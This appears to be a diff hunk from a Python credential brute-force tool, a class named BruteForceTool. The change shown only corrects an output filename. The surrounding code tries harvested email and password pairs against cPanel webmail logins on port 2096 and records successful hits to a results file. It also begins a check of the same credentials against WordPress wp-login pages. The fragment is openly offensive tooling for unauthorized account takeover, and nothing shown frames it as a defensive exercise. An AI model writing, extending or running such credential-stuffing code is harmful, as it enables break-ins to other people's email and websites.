@@ -160,7 +160,7 @@ class BruteForceTool:
         domain = self.URLdomain_luv(email.split('@')[1])
         user = email.split('@')[0]
         payload = {'user': user, 'pass': pwd}
-        self.perform_login(f'https://{domain}:2096/login/', payload, ['id_autoresponders'], 'Result/Wemail.txt', user, pwd)
+        self.perform_login(f'https://{domain}:2096/login/', payload, ['id_autoresponders'], 'Result/Webmail.txt', user, pwd)
 
     def check_wp_credentials(self, email, pwd, domain):
         url = f"https://{domain}/wp-login.php"
